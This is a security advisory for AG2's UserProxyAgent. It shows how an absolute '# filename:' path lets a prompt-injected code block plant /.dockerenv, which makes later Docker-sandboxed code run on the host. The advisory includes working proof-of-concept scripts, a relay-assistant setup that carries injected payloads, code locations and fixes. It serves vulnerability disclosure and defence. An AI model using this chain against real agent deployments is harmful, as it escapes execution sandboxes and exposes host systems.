# AG2 Legacy `# filename:` Arbitrary File Write and `/.dockerenv` Spoofing Chain

## 1. Summary

AG2's classic `UserProxyAgent` code-execution path contains a two-stage issue:

1. the legacy `# filename:` header allows writes to attacker-chosen absolute paths instead of staying inside `work_dir`;
2. later `use_docker=True` executions decide whether they are "already inside Docker" only by checking `/.dockerenv`, which can be planted in stage 1.

As a result, if an attacker can influence message content delivered to `UserProxyAgent`, they can first create `/.dockerenv` and then cause later code execution to run in the current AG2 runtime environment instead of the expected temporary Docker execution container.

This is not `AssistantAgent` executing code by itself. `AssistantAgent` does not execute code by default. The problem is that its default prompt explicitly supports emitting code blocks with `# filename:`, and `UserProxyAgent` will treat such content as executable input.

## 2. Details

### 2.1 Call chain

The real call chain is:

`AssistantAgent` produces a message
-> `UserProxyAgent.initiate_chat(...)`
-> `ConversableAgent.generate_reply()`
-> `generate_code_execution_reply()`
-> `execute_code_blocks()`
-> `run_code()`
-> `autogen.code_utils.execute_code()`

In the default reply order, `generate_code_execution_reply` is checked before `generate_oai_reply`, so code blocks in a received message are executed before any normal LLM reply is generated.

### 2.2 Stage 1: arbitrary file write via `# filename:`

The default `AssistantAgent` system prompt explicitly allows emitting:

```python
# filename: <filename>
...
```

In the legacy execution path, `UserProxyAgent` extracts the first-line `filename` from a Python code block and passes it into `execute_code()`.

`execute_code()` documents that `filename` must be relative, but the actual implementation is:

```python
filepath = os.path.join(work_dir, filename)
with open(filepath, "w", encoding="utf-8") as fout:
    fout.write(code)
```

If `filename` is absolute, such as `/.dockerenv`, `os.path.join(work_dir, filename)` returns the absolute path and escapes `work_dir`.

More importantly, this file write happens before the code decides whether to use the Docker branch, so even with `use_docker=True`, stage 1 writes into the current AG2 process environment first.

### 2.3 Stage 2: `/.dockerenv` spoofing changes the execution environment

At the start of `execute_code()`, AG2 samples:

```python
running_inside_docker = in_docker_container()
```

and `in_docker_container()` is implemented as:

```python
return os.path.exists("/.dockerenv")
```

The later branch is:

```python
if not use_docker or running_inside_docker:
    ...
```

Therefore, once stage 1 has created `/.dockerenv`, a later execution with `use_docker=True` is misclassified as "already inside Docker" and runs directly in the current environment instead of spawning the expected temporary execution container.

### 2.4 Attacker assumptions

Attackers exploit prompt injection to influence the content of the message ultimately sent to the `UserProxyAgent`, for example:

- a malicious prompt that causes an upstream `AssistantAgent` to emit a code block with `# filename:`;
- attacker-controlled Web / RAG / tool output that the assistant forwards;
- a multi-agent setup where one upstream agent emits a code block and `UserProxyAgent` executes it.

So prompt injection can be a practical entry point, but only if the application actually routes the tainted content into `UserProxyAgent`'s code-execution path.

## 3. Code Locations

- `autogen/agentchat/assistant_agent.py:21-23`
  - `AssistantAgent` does not execute code by default.
- `autogen/agentchat/assistant_agent.py:33`
  - the default prompt explicitly supports `# filename: <filename>`.
- `autogen/agentchat/user_proxy_agent.py:20`
  - `UserProxyAgent` enables code execution by default.
- `autogen/agentchat/conversable_agent.py:377-381`
  - the legacy `code_execution_config` path registers `generate_code_execution_reply`.
- `autogen/agentchat/conversable_agent.py:3180-3185`
  - `generate_code_execution_reply` is checked before `generate_oai_reply`.
- `autogen/agentchat/conversable_agent.py:2654-2697`
  - code blocks are extracted from message content and executed.
- `autogen/agentchat/conversable_agent.py:3451-3456`
  - `# filename: ...` is parsed from the first line of the Python block and passed into `run_code()`.
- `autogen/code_utils.py:231-237`
  - `in_docker_container()` only checks `/.dockerenv`.
- `autogen/code_utils.py:319-322`
  - the docstring says `filename` must be relative.
- `autogen/code_utils.py:350`
  - `running_inside_docker` is sampled before the write.
- `autogen/code_utils.py:369-375`
  - `os.path.join(work_dir, filename)` is followed by a direct `open()` write.
- `autogen/code_utils.py:377-388`
  - if `running_inside_docker` is true, execution happens directly in the current environment.

## 4. PoC

- `poc_01_plant_dockerenv.py`

  ~~~python
  from pathlib import Path
  
  from poc_utils import (
      assistant_mode,
      build_payload_assistant,
      build_user_proxy,
      ensure_docker_running,
      ensure_root,
      ensure_work_dir,
      extract_execution_result,
  )
  
  
  BOOTSTRAP_PAYLOAD = """```python
  # filename: /.dockerenv
  print("planted")
  ```"""
  
  
  def main() -> None:
      ensure_root()
      ensure_docker_running()
      if Path("/.dockerenv").exists():
          print("Refusing to run: /.dockerenv already exists.")
          raise SystemExit(1)
  
      ensure_work_dir()
      user_proxy = build_user_proxy()
      result = user_proxy.initiate_chat(
          build_payload_assistant("assistant_planter", BOOTSTRAP_PAYLOAD),
          clear_history=True,
          silent=True,
          message=BOOTSTRAP_PAYLOAD,
          max_turns=2,
      )
  
      print("assistant_mode:", assistant_mode())
      print("planted:", Path("/.dockerenv").exists())
      print(extract_execution_result(result.chat_history))
  
  
  if __name__ == "__main__":
      main()
  
  ~~~

  Planting forged documents

- `poc_02_execute_prompt_payload.py`

  ~~~python
  from pathlib import Path
  
  from poc_utils import (
      assistant_mode,
      build_payload_assistant,
      build_user_proxy,
      ensure_docker_running,
      ensure_work_dir,
      extract_execution_result,
  )
  
  
  ATTACKER_PROMPT = """```python
  import os
  
  cwd = os.getcwd()
  dockerenv = os.path.exists("/.dockerenv")
  
  print("dockerenv:", dockerenv)
  print("cwd:", cwd)
  ```
  """.strip()
  
  
  def main() -> None:
      ensure_docker_running()
      ensure_work_dir()
  
      mode = "planted/local" if Path("/.dockerenv").exists() else "baseline/docker"
      user_proxy = build_user_proxy()
      result = user_proxy.initiate_chat(
          build_payload_assistant("relay_assistant", ATTACKER_PROMPT),
          clear_history=True,
          silent=True,
          message=ATTACKER_PROMPT,
          max_turns=2,
      )
  
      print("assistant_mode:", assistant_mode())
      print("mode:", mode)
      print(extract_execution_result(result.chat_history))
  
  
  if __name__ == "__main__":
      main()
  
  ~~~

- Standard multi-agent system

  ```python
  import os
  import sys
  from pathlib import Path
  from typing import Any
  
  from autogen import AssistantAgent, UserProxyAgent
  from autogen.code_utils import is_docker_running
  
  
  WORK_DIR = "coding"
  LLM_MODE_ENV = "AG2_POC_USE_LLM"
  LLM_API_KEY_ENV = "AG2_POC_OPENAI_API_KEY"
  LLM_BASE_URL_ENV = "AG2_POC_OPENAI_BASE_URL"
  LLM_MODEL_ENV = "AG2_POC_MODEL"
  RELAY_SYSTEM_MESSAGE = """You are a relay assistant used in a security test.
  If the latest user message starts with "exitcode:", reply with exactly TERMINATE.
  Otherwise, reply with the latest user message content verbatim.
  Do not add explanations.
  Do not add or remove characters.
  """
  
  
  def is_terminate_message(message: dict[str, object]) -> bool:
      return str(message.get("content", "")).strip() == "TERMINATE"
  
  
  def build_user_proxy(name: str = "user_proxy") -> UserProxyAgent:
      return UserProxyAgent(
          name=name,
          human_input_mode="NEVER",
          max_consecutive_auto_reply=2,
          llm_config=True,
          is_termination_msg=is_terminate_message,
          code_execution_config={
              "work_dir": WORK_DIR,
              "use_docker": True,
          },
      )
  
  
  def build_payload_assistant(name: str, payload: str) -> AssistantAgent:
      llm_config = load_llm_config()
      if llm_config is not False:
          return AssistantAgent(
              name=name,
              llm_config=llm_config,
              system_message=RELAY_SYSTEM_MESSAGE,
          )
  
      return AssistantAgent(
          name=name,
          llm_config=True,
          default_auto_reply=payload,
      )
  
  
  def ensure_root() -> None:
      if os.geteuid() != 0:
          print("Run as root.")
          sys.exit(1)
  
  
  def ensure_docker_running() -> None:
      if not is_docker_running():
          print("Start Docker daemon first.")
          sys.exit(1)
  
  
  def ensure_work_dir() -> None:
      Path(WORK_DIR).mkdir(parents=True, exist_ok=True)
  
  
  def extract_execution_result(history: list[dict[str, Any]]) -> str:
      for message in reversed(history):
          content = str(message.get("content", ""))
          if content.startswith("exitcode:"):
              return content
      return "no execution result found"
  
  
  def load_llm_config() -> dict[str, Any] | bool:
      if not should_use_real_llm():
          return False
  
      api_key = os.environ.get(LLM_API_KEY_ENV) or os.environ.get("OPENAI_API_KEY")
      if not api_key:
          print(f"Set {LLM_API_KEY_ENV} or OPENAI_API_KEY for LLM mode.")
          sys.exit(1)
  
      model = os.environ.get(LLM_MODEL_ENV, "gpt-4o-mini")
      config: dict[str, Any] = {
          "config_list": [
              {
                  "model": model,
                  "api_key": api_key,
              }
          ],
          "temperature": 0,
      }
  
      base_url = os.environ.get(LLM_BASE_URL_ENV) or os.environ.get("OPENAI_BASE_URL")
      if base_url:
          config["config_list"][0]["base_url"] = base_url
  
      return config
  
  
  def should_use_real_llm() -> bool:
      env_value = os.environ.get(LLM_MODE_ENV)
      if env_value is None:
          return bool(os.environ.get(LLM_API_KEY_ENV) or os.environ.get("OPENAI_API_KEY"))
  
      return env_value.strip().lower() not in {"0", "false", "no", "off"}
  
  
  def assistant_mode() -> str:
      return "llm" if should_use_real_llm() else "static"
  ```

### Run

```bash
sudo python3 poc_01_plant_dockerenv.py
sudo python3 poc_02_execute_prompt_payload.py
```

### Expected behavior

As a baseline, running poc2 directly typically shows:

![image-20260622232025696](C:\Users\Administrator\Desktop\RuoyuZhou\Agent Testing\vuln_report\assets\image-20260622232025696.png)

which indicates that `use_docker=True` executed inside the temporary execution container.

After running poc1 and then poc2 again, the output changes to:

![image-20260622232057576](C:\Users\Administrator\Desktop\RuoyuZhou\Agent Testing\vuln_report\assets\image-20260622232057576.png)

This shows that poc2 no longer used the expected temporary Docker execution container and instead executed directly in the current AG2 runtime environment.

## 5. Impact

Code that was supposed to execute inside the Docker container is executing on the host machine.

## 6. CWE

- `CWE-73`: External Control of File Name or Path
- `CWE-22`: Path Traversal
- `CWE-807`: Reliance on Untrusted Inputs in a Security Decision

## 7. Simple Fix

At minimum, both weaknesses should be fixed:

1. strictly constrain `filename`
   - reject absolute paths;
   - normalize and resolve `work_dir / filename`;
   - verify that the resolved target still stays under `work_dir`;
   - reject execution otherwise.

2. do not rely on `/.dockerenv` alone for a security boundary decision
